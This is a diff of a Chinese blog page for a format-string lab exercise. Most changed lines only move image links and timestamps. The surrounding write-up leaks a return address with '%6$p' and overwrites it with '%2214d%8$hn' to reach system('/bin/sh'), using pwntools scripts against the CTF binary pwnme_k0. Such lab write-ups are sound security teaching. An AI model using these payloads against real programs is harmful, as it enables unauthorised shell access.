@@ -28,20 +28,20 @@
 <meta property="og:site_name" content="Leeyuxun の note">
 <meta property="og:description" content="实验目的掌握格式化字符串漏洞的原理以及在漏洞利用中的应用.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191114233347.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191114233900.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191114234539.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191115014326.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191115014234.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191115020247.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191115021245.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191115023952.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191114233347.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191114233900.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191114234539.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191115014326.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191115014234.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191115020247.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191115021245.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191115023952.png">
 <meta property="article:published_time" content="2019-12-20T14:55:08.000Z">
-<meta property="article:modified_time" content="2023-05-07T06:53:06.503Z">
+<meta property="article:modified_time" content="2023-05-07T07:37:53.542Z">
 <meta property="article:author" content="李钰璕">
 <meta property="article:tag" content="格式化字符串">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191114233347.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191114233347.png">
 
 <link rel="canonical" href="https://leeyuxun.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89.html">
 
@@ -249,7 +249,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-07 14:53:06" itemprop="dateModified" datetime="2023-05-07T14:53:06+08:00">2023-05-07</time>
+                <time title="修改时间：2023-05-07 15:37:53" itemprop="dateModified" datetime="2023-05-07T15:37:53+08:00">2023-05-07</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -289,16 +289,16 @@
 </ol>
 <h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><p>利用格式化字符串修改返回地址，以在函数返回时获取shell。</p>
 <h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol>
-<li><p>检查保护，发现开启了<code>RELRO</code>和<code>NX</code>保护；<br><img src="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191114233347.png"></p>
+<li><p>检查保护，发现开启了<code>RELRO</code>和<code>NX</code>保护；<br><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191114233347.png"></p>
 </li>
-<li><p>通过IDA进行反编译，发现在函数<code>sub_400B07</code>中存在格式化字符串漏洞，分析是由<code>printf(buf)</code>造成的；<br><img src="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191114233900.png"></p>
+<li><p>通过IDA进行反编译，发现在函数<code>sub_400B07</code>中存在格式化字符串漏洞，分析是由<code>printf(buf)</code>造成的；<br><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191114233900.png"></p>
 </li>
-<li><p>查看函数<code>sub_400B07</code>中的汇编语句<br><img src="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191114234539.png"></p>
+<li><p>查看函数<code>sub_400B07</code>中的汇编语句<br><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191114234539.png"></p>
 </li>
 <li><p>发现<code>printf</code>只压入了一个格式化的<code>format</code>参数,没有其它参数，下述根据程序运行过程可知，<code>sub_400B07</code>函数用于执行选项1，查看用户信息；</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.Sh0w Account Infomation!	#查看用户信息，不需要参数</span><br><span class="line">2.Ed1t Account Inf0mation!	#编辑用户信息，需要参数</span><br><span class="line">3.QUit sangebaimao:(		#退出</span><br></pre></td></tr></table></figure></li>
 <li><p>使用gdb在<code>0x400B28</code>处下断点进行调试，输入用户名、密码为<code>qq</code>，选择选项1，运行到断点出；</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191115014326.png"><br>发现要执行的命令为<code>call 0x400770</code>，而<code>0x400770</code>是<code>GOT</code>表中<code>printf</code>函数<br><img src="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191115014234.png"></p>
+<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191115014326.png"><br>发现要执行的命令为<code>call 0x400770</code>，而<code>0x400770</code>是<code>GOT</code>表中<code>printf</code>函数<br><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191115014234.png"></p>
 </li>
 <li><p>根据64位系统的特征，前六个参数会依次存放在<code>rdi</code>、<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code>中，之后的参数才存放在栈上，因为<code>rdi</code>中存放了<code>format</code>参数，所以<code>rsi</code>存放了<code>printf</code>函数的第1个实际参数，<code>r9</code>存放了第5个实际参数，那么栈顶第一个元素就是第6个实际参数，因此通过构造username的值为<code>%6$p</code>，将栈顶的第一个元素输出；</p>
 </li>
@@ -307,17 +307,17 @@
 <li><p>构造脚本如下，即可找到泄露出的返回地址在栈中的位置为<code>0x7ffd6ee4a728</code>(每次运行返回地址都在变化)；</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line">r.recv() </span><br><span class="line">r.sendline(<span class="string">&quot;%6$p&quot;</span>) </span><br><span class="line">r.recv() </span><br><span class="line">r.sendline(<span class="string">&quot;mypassword&quot;</span>) </span><br><span class="line">r.recv() r.sendline(<span class="string">&quot;1&quot;</span>) </span><br><span class="line">r.recvuntil(<span class="string">&quot;0x&quot;</span>) </span><br><span class="line">retn_addr = <span class="built_in">int</span>(r.recvline().strip(), <span class="number">16</span>) - <span class="number">0x38</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;retn_addr = &quot;</span> + <span class="built_in">hex</span>(retn_addr)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191115020247.png"></p>
+<p><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191115020247.png"></p>
 </li>
 <li><p>分析栈中内容，发现<code>username</code>相当于<code>printf</code>的第8个参数，想要把返回地址覆盖，可以使用<code>% num $ hn</code>，就是把本次输出的字节数写入到第num个参数指向的位置 </p>
 </li>
-<li><p>从IDA中很明显可以找到system(“/bin/sh”)的地址为<code>0x4008a6</code><br><img src="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191115021245.png"></p>
+<li><p>从IDA中很明显可以找到system(“/bin/sh”)的地址为<code>0x4008a6</code><br><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191115021245.png"></p>
 </li>
 <li><p>因此，只需要编辑用户资料，将username改为函数返回地址（栈顶的第二个元素），将password改为<code>%2214d%8$hn</code>，即把<code>0x08a6</code>写入到username指向的位置(<code>0x086a==2214d</code>)，改完后查看用户资料，调出<code>/bin/sh</code>；</p>
 </li>
 <li><p>脚本如下；</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwnme_k0&quot;</span>)</span><br><span class="line"><span class="comment">#泄露返回地址</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;%6$p&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;mypassword&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">retn_addr = <span class="built_in">int</span>(p.recvline().strip(),<span class="number">16</span>)-<span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;retn_addr=&quot;</span>+<span class="built_in">hex</span>(retn_addr)</span><br><span class="line"><span class="comment">#利用%num$hn覆写返回地址</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(retn_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;%2214d%8$hn&quot;</span>)</span><br><span class="line"><span class="comment">#查看用户资料从而调用/bin/sh </span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
-<li><p>执行脚本，成功getshell.<br><img src="https://cdn.jsdelivr.net/gh/Leeyuxun/pic-storage@master/img/20191115023952.png"></p>
+<li><p>执行脚本，成功getshell.<br><img src="https://raw.githubusercontent.com/Leeyuxun/pic-storage/main/img/20191115023952.png"></p>
 </li>
 </ol>
 
